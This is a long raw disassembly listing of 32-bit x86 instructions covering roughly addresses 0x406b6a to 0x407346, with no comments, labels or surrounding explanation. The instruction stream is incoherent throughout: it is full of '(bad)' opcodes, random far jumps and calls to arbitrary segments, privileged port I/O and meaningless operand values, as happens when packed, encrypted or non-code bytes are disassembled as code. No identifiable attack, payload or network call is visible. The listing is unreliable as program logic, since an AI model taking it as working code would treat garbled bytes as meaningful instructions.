  406b6a:	and    BYTE PTR [ebp+0x16ffcb43],dh
  406b70:	mov    bh,0x87
  406b72:	aas    
  406b73:	push   esp
  406b74:	jle    0x406b0c
  406b76:	fwait
  406b77:	mov    edi,0xa89bf50d
  406b7c:	(bad)
  406b7f:	pusha  
  406b80:	in     eax,0x8e
  406b82:	(bad)  
  406b83:	rol    al,1
  406b85:	aad    0x6a
  406b87:	aam    0x49
  406b89:	jge    0x406bea
  406b8b:	mov    ecx,DWORD PTR ds:0x77d9d708
  406b91:	mov    edx,0xb5f31655
  406b96:	sti    
  406b97:	inc    esp
  406b98:	ret    
  406b99:	push   0xffffffad
  406b9b:	bound  ecx,QWORD PTR [ecx]
  406b9d:	cmp    DWORD PTR [ecx+0x47],edi
  406ba0:	ins    BYTE PTR es:[edi],dx
  406ba1:	adc    ebp,ebx
  406ba3:	dec    ebx
  406ba4:	cli    
  406ba5:	fucomp st(3)
  406ba7:	sbb    DWORD PTR [ebx-0x342dde73],esp
  406bad:	pop    ebp
  406bae:	fisttp WORD PTR [ebp+0x77795f6b]
  406bb4:	add    al,0xd
  406bb6:	fstp   DWORD PTR [ebp+eiz*2-0x6c831d33]
  406bbd:	sbb    esp,ebx
  406bbf:	aaa    
  406bc0:	sbb    DWORD PTR [ebp-0x6],edi
  406bc3:	imul   BYTE PTR gs:[ebx+eiz*4+0x4a48e6ce]
  406bcb:	push   0xffffff8b
  406bcd:	mov    bl,0xdd
  406bcf:	push   ebx
  406bd0:	ror    BYTE PTR [edi],cl
  406bd2:	arpl   WORD PTR [eax+0x39],ax
  406bd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bd6:	inc    ebx
  406bd7:	outs   dx,DWORD PTR ds:[esi]
  406bd8:	sub    BYTE PTR [ecx-0x1c44f124],al
  406bde:	jmp    0xa7b8:0x3c6c2f2
  406be5:	aas    
  406be6:	pop    ebx
  406be7:	xchg   BYTE PTR [ebx],dh
  406be9:	mov    al,0xd
  406beb:	mov    bl,0x50
  406bed:	mov    ah,0xe9
  406bef:	arpl   WORD PTR [ebp+0x55],si
  406bf2:	sar    DWORD PTR [ebx],1
  406bf4:	inc    ebp
  406bf5:	push   ds
  406bf6:	leave  
  406bf7:	mov    bh,BYTE PTR ds:0x1be433e0
  406bfd:	test   DWORD PTR [esi-0x60876b4e],0x6de815f3
  406c07:	shl    BYTE PTR [edi],cl
  406c09:	iret   
  406c0a:	add    eax,0x2eb9d35d
  406c0f:	dec    ecx
  406c10:	leave  
  406c11:	push   edx
  406c12:	inc    edi
  406c13:	pop    ds
  406c14:	mov    dh,0x1b
  406c16:	leave  
  406c17:	sbb    DWORD PTR [ebx+0x28e88b56],ebp
  406c1d:	dec    edx
  406c1e:	inc    ebx
  406c1f:	in     al,dx
  406c20:	mov    eax,ds:0xcca2d569
  406c25:	mov    al,0x89
  406c27:	nop
  406c28:	pushf  
  406c29:	or     al,0xa8
  406c2b:	xor    DWORD PTR [esi],esi
  406c2d:	test   BYTE PTR [edi],dl
  406c2f:	nop
  406c30:	and    esi,DWORD PTR [eax-0x52c2a1ef]
  406c36:	imul   esi,DWORD PTR [ebx],0x5e50a4a7
  406c3c:	aaa    
  406c3d:	xchg   ebx,eax
  406c3e:	or     al,0x96
  406c40:	daa    
  406c41:	mov    ds:0x104e4055,eax
  406c46:	jns    0x406c77
  406c48:	jp     0x406bda
  406c4a:	inc    eax
  406c4b:	aam    0x29
  406c4d:	lds    ebx,FWORD PTR [ebx-0x75]
  406c50:	sub    edx,esp
  406c52:	popa   
  406c53:	shr    DWORD PTR [esi+0x17a611e5],cl
  406c59:	sbb    eax,0x3d71bf7
  406c5e:	dec    esi
  406c5f:	into   
  406c60:	and    DWORD PTR [edx],0xf99d84a8
  406c66:	(bad)  
  406c67:	pop    ebx
  406c68:	cmp    bl,BYTE PTR [edi]
  406c6a:	retf   0x1b3e
  406c6d:	cmp    eax,0x3dda4a7b
  406c72:	mov    WORD PTR [ecx+0x33deadb3],?
  406c78:	(bad)  
  406c79:	jmp    0x6c16d74
  406c7e:	xor    ah,BYTE PTR [edx-0x54]
  406c81:	push   esi
  406c82:	adc    ah,ch
  406c84:	and    al,0xa9
  406c86:	pop    esi
  406c87:	fnsave [esi]
  406c89:	pop    ecx
  406c8a:	and    DWORD PTR [edx-0x78753cc4],edi
  406c90:	xchg   ebx,eax
  406c91:	cs and ebp,ecx
  406c94:	lea    ecx,[edi+0x3fc78619]
  406c9a:	xchg   ebx,eax
  406c9b:	adc    esp,eax
  406c9d:	pop    esi
  406c9e:	inc    esi
  406c9f:	sub    edi,DWORD PTR ds:0x27215cde
  406ca5:	jae    0x406cc0
  406ca7:	cld    
  406ca8:	jmp    0x406cf5
  406caa:	pop    ebp
  406cab:	push   edi
  406cac:	or     al,0x82
  406cae:	test   esi,esi
  406cb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cb1:	jae    0x406cb3
  406cb3:	or     eax,0x40f9e8f6
  406cb8:	mov    dl,0xde
  406cba:	sbb    eax,0x8c6483dd
  406cbf:	adc    eax,0x680dd86e
  406cc4:	ins    BYTE PTR es:[edi],dx
  406cc5:	ins    DWORD PTR es:[edi],dx
  406cc6:	sahf   
  406cc7:	int3   
  406cc8:	mov    ebx,0x73d280cc
  406ccd:	pop    esp
  406cce:	js     0x406c76
  406cd0:	test   al,0xbf
  406cd2:	jns    0x406cc6
  406cd4:	nop
  406cd5:	retf   
  406cd6:	cmp    BYTE PTR [ebp-0x54f2fe79],0xac
  406cdd:	repnz mov ecx,0xc478db4c
  406ce3:	out    dx,eax
  406ce4:	popa   
  406ce5:	(bad)  
  406ce6:	sti    
  406ce7:	mov    cl,0x9d
  406ce9:	call   FWORD PTR [ebp+0x25777e83]
  406cef:	sbb    dl,0xa7
  406cf2:	sub    eax,0xaaaf87af
  406cf7:	in     eax,dx
  406cf8:	mov    eax,0xe2ba629d
  406cfd:	in     al,dx
  406cfe:	mov    bh,0x21
  406d00:	or     eax,0xca40eded
  406d05:	mov    esi,0xdf086ca7
  406d0a:	push   0x9269c001
  406d0f:	xchg   edx,eax
  406d10:	jecxz  0x406ca5
  406d12:	cmp    DWORD PTR [edx+0x6c],0xa3679963
  406d19:	cmp    eax,0x43d6d0be
  406d1e:	or     dl,BYTE PTR [eax-0x177f3c08]
  406d24:	jmp    0x779d:0x84c9f31d
  406d2b:	add    eax,0x43679f4
  406d30:	repz fnstenv [edx]
  406d33:	mov    eax,0xcc6cfa77
  406d38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d39:	ins    DWORD PTR es:[edi],dx
  406d3a:	sbb    cl,bl
  406d3c:	pop    esi
  406d3d:	push   0x1b
  406d3f:	and    al,0x68
  406d41:	and    eax,0xbdbd1257
  406d46:	test   eax,0x9fac1a00
  406d4b:	pop    ebp
  406d4c:	mov    al,0xe
  406d4e:	test   al,0xc9
  406d50:	fwait
  406d51:	aam    0x50
  406d53:	mov    ch,dh
  406d55:	sbb    DWORD PTR [edx+0x6c2ed5bd],esp
  406d5b:	mov    ch,0x84
  406d5d:	es int 0xcb
  406d60:	icebp  
  406d61:	int    0x9c
  406d63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d64:	scas   eax,DWORD PTR es:[edi]
  406d65:	cld    
  406d66:	repz and al,0x10
  406d69:	in     eax,dx
  406d6a:	push   edi
  406d6b:	add    DWORD PTR [esi+0x4fccbb1f],ebx
  406d71:	sub    bl,dh
  406d73:	sahf   
  406d74:	pop    edi
  406d75:	push   0x47
  406d77:	bound  edx,QWORD PTR [ecx-0x2e76db7d]
  406d7d:	lock mov ch,0x67
  406d80:	xchg   edi,eax
  406d81:	lahf   
  406d82:	mov    al,0x7e
  406d84:	dec    edi
  406d85:	loope  0x406d62
  406d87:	push   cs
  406d88:	retf   
  406d89:	mov    esp,0x30bf18b0
  406d8e:	aaa    
  406d8f:	loop   0x406d5b
  406d91:	jb     0x406d23
  406d93:	sub    ebp,DWORD PTR [esi-0x51156358]
  406d99:	jmp    DWORD PTR [eax]
  406d9b:	into   
  406d9c:	(bad)
  406da1:	add    cx,WORD PTR [ebp+0x24]
  406da5:	cmp    eax,0xeb676940
  406daa:	fdiv   QWORD PTR [eax+ebx*4+0x224fca93]
  406db1:	dec    esp
  406db2:	gs (bad) 
  406db4:	fst    DWORD PTR [ebx+0x3]
  406db7:	adc    al,0xaa
  406db9:	push   ebp
  406dba:	sub    eax,0x4b55696b
  406dbf:	mov    eax,DWORD PTR [esi]
  406dc1:	bnd jae 0x406db3
  406dc4:	xchg   edx,eax
  406dc5:	and    ebp,esi
  406dc7:	lods   eax,DWORD PTR ds:[esi]
  406dc8:	pop    es
  406dc9:	xchg   ebx,eax
  406dca:	dec    ecx
  406dcb:	fisubr WORD PTR [esi+0x50]
  406dce:	test   BYTE PTR [edi-0x7636abd0],al
  406dd4:	mov    ch,0x78
  406dd6:	adc    eax,0x1de9591a
  406ddb:	fcmovnb st,st(1)
  406ddd:	cmp    edi,DWORD PTR [ecx]
  406ddf:	sbb    al,BYTE PTR [edx+ebx*1+0x72fa95b8]
  406de6:	cmp    DWORD PTR [esi],edi
  406de8:	or     ecx,DWORD PTR [edx+0x15a39072]
  406dee:	push   eax
  406def:	jg     0x406db1
  406df1:	or     al,0x54
  406df3:	xchg   esp,eax
  406df4:	push   esi
  406df5:	sub    DWORD PTR [esi],edx
  406df7:	scas   al,BYTE PTR es:[edi]
  406df8:	into   
  406df9:	dec    edi
  406dfa:	sub    eax,0xc1a47316
  406dff:	rcl    BYTE PTR [edi*4+0x1aa642c7],1
  406e06:	xchg   edi,eax
  406e07:	cmp    DWORD PTR [edi],ebp
  406e09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e0a:	fnstsw WORD PTR [ebx+0x64b9dfa3]
  406e10:	adc    DWORD PTR [edi+0x34343cf4],esi
  406e16:	jmp    0x406e0a
  406e18:	add    edx,DWORD PTR [ebp+0x79]
  406e1b:	or     ah,al
  406e1d:	xor    BYTE PTR [ecx-0x24],ah
  406e20:	xor    DWORD PTR [edx],0x18d46f2b
  406e26:	push   edi
  406e27:	sub    BYTE PTR [edi-0x4e],ch
  406e2a:	ins    DWORD PTR es:[edi],dx
  406e2b:	sbb    bh,ch
  406e2d:	inc    edx
  406e2e:	enter  0xdb5c,0x3f
  406e32:	enter  0x92e3,0x13
  406e36:	cmp    eax,0x125ad28b
  406e3b:	cwde   
  406e3c:	cmp    DWORD PTR [ebx],edx
  406e3e:	bound  ecx,QWORD PTR [ecx+0x601787dd]
  406e44:	outs   dx,DWORD PTR ds:[esi]
  406e45:	mov    ah,0xe9
  406e47:	pop    eax
  406e48:	sub    al,0x5c
  406e4a:	inc    esi
  406e4b:	sbb    al,bh
  406e4d:	add    BYTE PTR [edx],0xc4
  406e50:	(bad)  
  406e51:	sbb    ebx,DWORD PTR [ecx-0x35]
  406e54:	and    edx,DWORD PTR [esi]
  406e56:	mov    esi,0x46c092c3
  406e5b:	iret   
  406e5c:	xor    al,0x86
  406e5e:	fist   DWORD PTR [edx]
  406e60:	icebp  
  406e61:	cmp    ah,cl
  406e63:	shl    BYTE PTR [ecx],0x2c
  406e66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e67:	es aas 
  406e69:	clc    
  406e6a:	and    eax,0xee38026
  406e6f:	cmp    dl,ah
  406e71:	pop    eax
  406e72:	jp     0x406e79
  406e74:	and    esp,DWORD PTR [ebx]
  406e76:	imul   esp,DWORD PTR [ebp+0x31],0x11b94579
  406e7d:	pop    eax
  406e7e:	sub    dl,BYTE PTR [edi]
  406e80:	xchg   edi,eax
  406e81:	or     eax,0xcabfb02f
  406e86:	pop    edi
  406e87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e88:	xchg   esp,eax
  406e89:	fmul   DWORD PTR [ecx+0x47]
  406e8c:	idiv   DWORD PTR [ecx+0xfefdc68]
  406e92:	inc    edi
  406e93:	and    DWORD PTR [ebp+0x2932c72e],edx
  406e99:	pop    ebp
  406e9a:	jecxz  0x406ed3
  406e9c:	imul   esi,DWORD PTR [ebx+0x6a8b1524],0x8e132483
  406ea6:	fadd   QWORD PTR [edx+0x63]
  406ea9:	inc    edi
  406eaa:	psubusw mm5,mm4
  406ead:	sub    BYTE PTR [ecx-0x6162aed4],al
  406eb3:	data16 mov al,ds:0x283b4282
  406eb9:	imul   DWORD PTR [esi-0x16]
  406ebc:	push   ds
  406ebd:	repz push 0x16
  406ec0:	pushf  
  406ec1:	repnz push cs
  406ec3:	fild   DWORD PTR [edi]
  406ec5:	dec    edi
  406ec6:	out    dx,eax
  406ec7:	add    BYTE PTR [ecx-0x58864934],0xfb
  406ece:	scas   eax,DWORD PTR es:[edi]
  406ecf:	ret    
  406ed0:	mov    ebx,0x5c4842b9
  406ed5:	shr    DWORD PTR [ebx+0x4d],cl
  406ed8:	jae    0x406ebb
  406eda:	loope  0x406e84
  406edc:	mov    edx,0x3f31020d
  406ee1:	in     eax,dx
  406ee2:	sbb    BYTE PTR [ebp-0x458d3f8e],0x6e
  406ee9:	setge  BYTE PTR [edx-0x7140b1dc]
  406ef0:	outs   dx,DWORD PTR ds:[esi]
  406ef1:	test   BYTE PTR [edx],0x9
  406ef4:	(bad)  
  406ef5:	outs   dx,BYTE PTR ds:[esi]
  406ef6:	mov    ah,0xd0
  406ef8:	or     eax,DWORD PTR [ebx+eax*4+0x13238bd6]
  406eff:	dec    edi
  406f00:	(bad)  
  406f01:	jmp    0xd82:0x2a7146cd
  406f08:	pop    ds
  406f09:	push   0x34
  406f0b:	daa    
  406f0c:	jno    0x406f4a
  406f0e:	in     eax,0x49
  406f10:	loop   0x406edf
  406f12:	inc    esp
  406f13:	adc    cl,BYTE PTR [ecx-0x5b]
  406f16:	hlt    
  406f17:	add    al,0x83
  406f19:	lea    edx,es:[edi]
  406f1c:	repz (bad) 
  406f1e:	dec    esi
  406f1f:	mov    esp,0x2c26542d
  406f24:	iret   
  406f25:	aas    
  406f26:	jb     0x406f64
  406f28:	mov    eax,0x7f90cfa0
  406f2d:	adc    ah,BYTE PTR [edi+0x17d7255d]
  406f33:	call   0x3fec:0x2b64316a
  406f3a:	and    BYTE PTR [eax],0xe
  406f3d:	dec    ebx
  406f3e:	fcom   DWORD PTR [ecx+0x60]
  406f41:	push   0x0
  406f43:	out    0xed,eax
  406f45:	bound  eax,QWORD PTR [ecx-0x19a2d34e]
  406f4b:	aad    0x5d
  406f4d:	add    al,0x68
  406f4f:	pushf  
  406f50:	sahf   
  406f51:	jecxz  0x406f39
  406f53:	sbb    al,0x6a
  406f55:	lods   al,BYTE PTR ds:[esi]
  406f56:	mov    WORD PTR [di+0x20],?
  406f5a:	mov    esi,0xab57cbec
  406f5f:	cmp    BYTE PTR [ebx+0x466f8428],0x8e
  406f66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f67:	mov    ebx,DWORD PTR [ecx]
  406f69:	loop   0x406fe5
  406f6b:	shl    ch,cl
  406f6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f6e:	jge    0x406fdc
  406f70:	shl    BYTE PTR [ebp-0x1dcc518],cl
  406f76:	dec    ebp
  406f77:	popf   
  406f78:	pop    es
  406f79:	mov    al,ds:0x2c82411c
  406f7e:	(bad)  
  406f7f:	(bad)  
  406f80:	pop    edi
  406f81:	int    0xae
  406f83:	adc    DWORD PTR [edi],edi
  406f85:	scas   eax,DWORD PTR es:[edi]
  406f86:	xchg   esp,eax
  406f87:	test   BYTE PTR [esi+0x17],bh
  406f8a:	inc    eax
  406f8b:	icebp  
  406f8c:	and    ebx,ecx
  406f8e:	add    BYTE PTR [ecx],ch
  406f90:	jb     0x406f8e
  406f92:	xchg   edx,eax
  406f93:	jno    0x406f1a
  406f95:	adc    ah,BYTE PTR [edi+0x2a9b2da6]
  406f9b:	mov    bl,BYTE PTR [eax+0x3aaedd0]
  406fa1:	inc    ebx
  406fa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fa3:	push   edi
  406fa4:	imul   edi,DWORD PTR [edx-0x201d7233],0x8ab3235
  406fae:	test   DWORD PTR [ebp+0x3d],eax
  406fb1:	dec    ebx
  406fb2:	loop   0x406fdd
  406fb4:	popa   
  406fb5:	mov    DWORD PTR [ebx+0x25f41e95],esi
  406fbb:	retf   
  406fbc:	jno    0x406f63
  406fbe:	sub    BYTE PTR [ebx],0x6d
  406fc1:	in     al,0x34
  406fc3:	mov    edi,DWORD PTR [edi-0x5ee4f5af]
  406fc9:	sub    al,0x58
  406fcb:	or     al,0x76
  406fcd:	(bad)  
  406fce:	jl     0x406f81
  406fd0:	sub    ecx,DWORD PTR [ecx+esi*8+0x5a21cebe]
  406fd7:	push   ss
  406fd8:	cs jp  0x406ff3
  406fdb:	mov    ds:0xf8fb02c1,al
  406fe0:	sahf   
  406fe1:	inc    esp
  406fe2:	popa   
  406fe3:	or     ebp,ebp
  406fe5:	loope  0x406ff4
  406fe7:	inc    edx
  406fe8:	je     0x407005
  406fea:	jl     0x407019
  406fec:	xchg   esi,eax
  406fed:	dec    edx
  406fee:	sti    
  406fef:	fs out 0x12,eax
  406ff2:	push   ds
  406ff3:	icebp  
  406ff4:	jl     0x406f7e
  406ff6:	lock and BYTE PTR [ecx],ch
  406ff9:	fistp  DWORD PTR [edi+0x2e021fdd]
  406fff:	in     eax,0x26
  407001:	push   0x48
  407003:	ret    0x4c1d
  407006:	sub    edi,DWORD PTR [ebx+0x73d55764]
  40700c:	popa   
  40700d:	add    edi,DWORD PTR [ecx-0x4a]
  407010:	int3   
  407011:	fst    QWORD PTR [ebx]
  407013:	jmp    0x407033
  407015:	cld    
  407016:	iret   
  407017:	sar    DWORD PTR [eax+ebp*1+0x4e],1
  40701b:	jle    0x40702b
  40701d:	mov    BYTE PTR [edx],dl
  40701f:	lahf   
  407020:	pop    eax
  407021:	ja     0x407052
  407023:	sahf   
  407024:	fisubr WORD PTR [esi+0x574e4be7]
  40702a:	adc    al,0xe0
  40702c:	scas   eax,DWORD PTR es:[edi]
  40702d:	outs   dx,BYTE PTR ds:[esi]
  40702e:	adc    eax,0xf0018094
  407033:	jg     0x406fd2
  407035:	sti    
  407036:	int    0x74
  407038:	adc    eax,0x72718ee2
  40703d:	stos   DWORD PTR es:[edi],eax
  40703e:	int    0x94
  407040:	adc    BYTE PTR [edx+eax*4+0x27],0xbc
  407045:	jecxz  0x406fda
  407047:	inc    esp
  407048:	rcl    BYTE PTR [esi-0x7b],0x80
  40704c:	std    
  40704d:	sub    edx,edx
  40704f:	int3   
  407050:	adc    al,BYTE PTR [ebx-0x6330f606]
  407056:	jns    0x40702e
  407058:	lds    ebp,FWORD PTR [esi]
  40705a:	out    0x94,al
  40705c:	add    eax,0xa7c28274
  407061:	mov    esi,0xa2bffd78
  407066:	sbb    dl,BYTE PTR [esi]
  407068:	inc    esi
  407069:	cmc    
  40706a:	adc    ax,0xbf07
  40706e:	shl    BYTE PTR [edx+edi*1-0x5fe50953],cl
  407075:	out    dx,eax
  407076:	sub    DWORD PTR [esi+esi*2-0x1b7321e],0x56335a40
  407081:	or     eax,0x477a29d3
  407086:	adc    al,0xf3
  407088:	in     al,dx
  407089:	sbb    al,0x84
  40708b:	sti    
  40708c:	aas    
  40708d:	xor    ebp,DWORD PTR [edi]
  40708f:	call   0x1e52:0xc08fe77f
  407096:	into   
  407097:	outs   dx,BYTE PTR ds:[esi]
  407098:	jmp    0xcda3:0x4a7f0088
  40709f:	jg     0x407060
  4070a1:	pop    ds
  4070a2:	lea    edi,[edi]
  4070a4:	mov    esp,0xbea77951
  4070a9:	call   0xfacb:0xc70dae94
  4070b0:	mov    ds:0x4e7799e7,al
  4070b5:	jl     0x407053
  4070b7:	stos   BYTE PTR es:[edi],al
  4070b8:	outs   dx,BYTE PTR ds:[esi]
  4070b9:	fidiv  WORD PTR [ebx]
  4070bb:	pop    ss
  4070bc:	(bad)  
  4070bd:	jbe    0x4070f7
  4070bf:	dec    edx
  4070c0:	js     0x4070a1
  4070c2:	mov    eax,ss:0xe11c9fff
  4070c8:	cld    
  4070c9:	and    cl,BYTE PTR [edi-0x23]
  4070cc:	mov    dl,0x5a
  4070ce:	leave  
  4070cf:	adc    ebx,DWORD PTR [ebx-0x9]
  4070d2:	xchg   ecx,ecx
  4070d4:	(bad)
  4070d8:	jl     0x407147
  4070da:	lods   eax,DWORD PTR ds:[esi]
  4070db:	xlat   BYTE PTR ds:[ebx]
  4070dc:	retf   
  4070dd:	(bad)  [esi]
  4070df:	inc    ecx
  4070e0:	lds    edx,FWORD PTR [edi-0x4d]
  4070e3:	stos   DWORD PTR es:[edi],eax
  4070e4:	(bad)  
  4070e6:	shr    DWORD PTR [esi+0x3c4688ab],0x93
  4070ed:	stos   DWORD PTR es:[edi],eax
  4070ee:	sbb    DWORD PTR [esi-0x38a986fc],0xffffffa0
  4070f5:	jg     0x40710d
  4070f7:	gs inc ecx
  4070f9:	add    al,BYTE PTR [esi-0x69]
  4070fc:	fisttp WORD PTR [edx]
  4070fe:	and    cl,BYTE PTR [ebx+0x7a152660]
  407104:	xchg   ebp,eax
  407105:	xor    eax,0x675a0e39
  40710a:	xchg   esp,eax
  40710b:	addr16 aad 0xf4
  40710e:	js     0x407115
  407110:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407111:	inc    edx
  407112:	mov    dh,0x7c
  407114:	ss cmp al,ah
  407117:	test   BYTE PTR [esp+edx*8],bh
  40711a:	inc    ecx
  40711b:	mov    ecx,eax
  40711d:	stc    
  40711e:	sbb    al,0x5e
  407120:	int3   
  407121:	bound  eax,QWORD PTR [ebx-0x2e]
  407124:	loopne 0x40713b
  407126:	cmp    eax,0x8eaabd08
  40712b:	dec    ecx
  40712c:	xor    al,0x4f
  40712e:	test   al,0xe2
  407130:	xor    ebp,esi
  407132:	retf   
  407133:	mov    ebx,0x2840f1f7
  407138:	into   
  407139:	add    al,0x92
  40713b:	jb     0x40717c
  40713d:	aaa    
  40713e:	xchg   edi,eax
  40713f:	lea    esi,[ecx+0x35564b4e]
  407145:	lea    eax,[edx]
  407147:	ret    0x7e9a
  40714a:	pop    ss
  40714b:	sub    esi,edx
  40714d:	sbb    al,0x9
  40714f:	xchg   bl,dh
  407151:	stc    
  407152:	call   0xa9c7c389
  407157:	mov    esi,0x1a836f05
  40715c:	daa    
  40715d:	sbb    eax,0xff1c7d64
  407162:	inc    edx
  407163:	jo     0x407141
  407165:	xchg   ebx,eax
  407166:	and    BYTE PTR [esi],0x5e
  407169:	int3   
  40716a:	ja     0x4071be
  40716c:	stos   DWORD PTR es:[edi],eax
  40716d:	jns    0x4070ff
  40716f:	jge    0x407131
  407171:	(bad)  
  407172:	fadd   QWORD PTR [edi+ebx*1]
  407175:	jl     0x4071e8
  407177:	jl     0x4071d9
  407179:	inc    ah
  40717b:	push   eax
  40717c:	fisttp DWORD PTR [esp+eax*8]
  40717f:	mov    eax,0xedca3f4
  407184:	push   0x927ea92e
  407189:	cwde   
  40718a:	xor    edx,ebx
  40718c:	enter  0xe12f,0xf4
  407190:	mov    cl,0x9b
  407192:	dec    edx
  407193:	cld    
  407194:	movaps xmm1,xmm6
  407197:	ja     0x407200
  407199:	sub    DWORD PTR [ebp+0xd96dc00],esp
  40719f:	cmp    dh,BYTE PTR es:[eiz*4+0x73c8d780]
  4071a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071a8:	jne    0x4071f5
  4071aa:	mov    al,ds:0x997b77fa
  4071af:	div    DWORD PTR [esi]
  4071b1:	clc    
  4071b2:	mov    cl,0xb5
  4071b4:	xchg   BYTE PTR [esp+eax*4],al
  4071b7:	push   edx
  4071b8:	pop    ss
  4071b9:	mov    bh,0xdd
  4071bb:	es inc esp
  4071bd:	jb     0x40723a
  4071bf:	imul   esi,DWORD PTR [ecx-0x50],0x5ec10d22
  4071c6:	ffree  st(7)
  4071c8:	enter  0xf3c,0x13
  4071cc:	stos   BYTE PTR es:[edi],al
  4071cd:	push   ss
  4071ce:	push   ss
  4071cf:	fnstenv [ebx-0x19]
  4071d2:	cwde   
  4071d3:	adc    ah,ah
  4071d5:	sbb    ch,0x13
  4071d8:	dec    ebx
  4071d9:	add    al,0xaa
  4071db:	xor    edx,DWORD PTR [ebp+0x18]
  4071de:	jmp    0x4071d0
  4071e0:	repnz dec edi
  4071e2:	add    eax,DWORD PTR [eax+0x9]
  4071e5:	dec    edi
  4071e6:	adc    al,0xba
  4071e8:	inc    ecx
  4071e9:	jecxz  0x407196
  4071eb:	outs   dx,BYTE PTR ds:[esi]
  4071ec:	icebp  
  4071ed:	jmp    0xcc3870e2
  4071f2:	sar    edi,1
  4071f4:	lock adc dh,0xd
  4071f8:	inc    ebp
  4071f9:	inc    edi
  4071fa:	sub    ecx,DWORD PTR [ecx+ecx*2]
  4071fd:	repnz jmp 0xc39d:0xa510c8e7
  407205:	fisubr DWORD PTR [edx]
  407207:	dec    esp
  407208:	enter  0x2678,0x77
  40720c:	shl    ebp,0x84
  40720f:	fidiv  DWORD PTR [esi]
  407211:	xlat   BYTE PTR ds:[ebx]
  407212:	adc    eax,0x4acd9283
  407217:	adc    DWORD PTR [esi-0x5bf816b8],ebp
  40721d:	pop    ebx
  40721e:	mov    WORD PTR [ebx+0x1a5e00a3],ss
  407224:	dec    edi
  407225:	stos   BYTE PTR es:[edi],al
  407226:	fisubr DWORD PTR [eax+0xfdc3a2c]
  40722c:	mov    al,0x55
  40722e:	sub    ah,BYTE PTR [ebx-0x157c80e8]
  407234:	push   ecx
  407235:	jne    0x4071e2
  407237:	mov    ebp,DWORD PTR [esp+esi*4]
  40723a:	jp     0x40721a
  40723c:	ins    BYTE PTR es:[edi],dx
  40723d:	test   eax,0xc454e08b
  407242:	das    
  407243:	add    BYTE PTR [edx],dh
  407245:	cmc    
  407246:	sub    eax,0x7b3b5a0c
  40724b:	inc    ebp
  40724c:	call   0x6708:0xa2f74e92
  407253:	dec    edi
  407254:	and    al,0x15
  407256:	sahf   
  407257:	sbb    al,0xc7
  407259:	data16 fcmove st,st(5)
  40725c:	dec    edi
  40725d:	jne    0x407298
  40725f:	xor    al,0x38
  407261:	fild   QWORD PTR [edx+0x0]
  407264:	(bad)  
  407265:	ins    BYTE PTR es:[edi],dx
  407266:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407267:	jmp    0x407208
  407269:	lods   eax,DWORD PTR ds:[esi]
  40726a:	jo     0x40729e
  40726c:	jmp    0xcbcde386
  407271:	inc    esp
  407272:	adc    eax,0x99d43ed6
  407277:	mov    es,WORD PTR [esi+0x49]
  40727a:	nop
  40727b:	xchg   BYTE PTR [edi],dl
  40727d:	adc    BYTE PTR [esi-0x47],dl
  407280:	ficom  DWORD PTR [edi+0x1a]
  407283:	mov    ebp,0x793e1c0b
  407288:	(bad)  [edi+edx*4+0x1164ab38]
  40728f:	pop    es
  407290:	shl    edi,cl
  407292:	add    dl,BYTE PTR [eax-0x78]
  407295:	loop   0x407253
  407297:	inc    ebx
  407298:	dec    esp
  407299:	std    
  40729a:	dec    ebp
  40729b:	mov    ds:0xd79f2f84,eax
  4072a0:	cmp    edx,edi
  4072a2:	xor    ch,BYTE PTR fs:[eax+0x71]
  4072a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072a7:	loope  0x407324
  4072a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072aa:	sbb    eax,0x75d3a38
  4072af:	mov    ds:0x87c4443e,eax
  4072b4:	frstor [edi-0x25]
  4072b7:	mov    esp,0x5f816908
  4072bc:	nop
  4072bd:	fbld   TBYTE PTR [ebx]
  4072bf:	fst    DWORD PTR [eax+esi*1+0x4ef91dc4]
  4072c6:	sbb    dh,0x47
  4072c9:	pop    eax
  4072ca:	jl     0x4072bb
  4072cc:	xchg   ebx,eax
  4072cd:	mov    ah,0x1
  4072cf:	pop    ds
  4072d0:	xor    eax,0x70ccd669
  4072d5:	mov    ch,0x59
  4072d7:	cmp    al,0x0
  4072d9:	jg     0x407336
  4072db:	mov    cl,0x47
  4072dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072de:	pop    es
  4072df:	mov    ds:0x2c4420fc,eax
  4072e4:	or     BYTE PTR [edi-0xb],ah
  4072e7:	(bad)  
  4072e8:	fdiv   st(2),st
  4072ea:	mov    edx,0x6d4ef7f5
  4072ef:	xchg   edx,eax
  4072f0:	scas   al,BYTE PTR es:[edi]
  4072f1:	rcl    DWORD PTR [edx+0x176d76e1],0xe4
  4072f8:	xor    dh,al
  4072fa:	mov    cl,0x5c
  4072fc:	sbb    DWORD PTR [edi+0x368b1fd8],esp
  407302:	mov    cl,0xaf
  407304:	and    eax,0x9e7c770b
  407309:	test   BYTE PTR [ebx],0x67
  40730c:	fwait
  40730d:	mov    ds:0x1bc56eb6,al
  407312:	jge    0x407352
  407314:	xor    eax,ecx
  407316:	mov    esi,0xefa0dde6
  40731b:	xor    DWORD PTR [eax-0x5bc28fe0],ecx
  407321:	dec    eax
  407322:	scas   eax,DWORD PTR es:[edi]
  407323:	rcl    DWORD PTR [eax+eax*1-0x6],0xe3
  407328:	sub    bh,BYTE PTR [edi-0x5c]
  40732b:	cmp    BYTE PTR [edx+0x34],cl
  40732e:	mov    ebp,0x17d02b9a
  407333:	push   ecx
  407334:	outs   dx,DWORD PTR ds:[esi]
  407335:	pop    ebp
  407336:	add    al,0x88
  407338:	mov    BYTE PTR [ecx-0x71c17c14],dh
  40733e:	jno    0x40732d
  407340:	mov    ch,0x4c
  407342:	rcr    DWORD PTR [ebp+ebx*8-0x7],1
  407346:	popa   
